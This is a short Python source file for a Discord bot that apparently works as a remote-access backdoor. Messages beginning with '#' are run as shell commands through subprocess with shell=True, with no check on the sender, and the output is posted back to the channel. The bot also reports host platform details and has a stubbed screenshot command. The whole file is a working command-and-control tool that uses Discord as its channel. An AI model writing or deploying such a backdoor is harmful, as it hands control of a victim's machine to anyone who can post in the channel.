import discord
import os
import platform
import subprocess

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    # set command
    result = None
    cmd = None
    if message.content.startswith('#'):
        cmd = message.content
    else:
        return
    
    # all commands
    cmd_split = cmd.split(' ')
    if cmd == "#info":
        result = platform.platform() + " " + os.getcwd()

    elif cmd == "#screenshot":
        result = "TODO"

    elif cmd.startswith('#cd '):
        try:
            os.chdir(cmd_split[1].strip("'"))
            result = os.getcwd()
        except FileNotFoundError:
            result = "error: repertory doesn't exist"

    # accept real cmd
    else:
        c = cmd.split('#')[1]
        r = subprocess.run(c, shell=True, capture_output=True, universal_newlines=True)
        result = r.stdout + r.stderr
        if not result or len(result) == 0:
            result = " "

    # send command result
    if result:
        await message.channel.send(result)





client.run('token')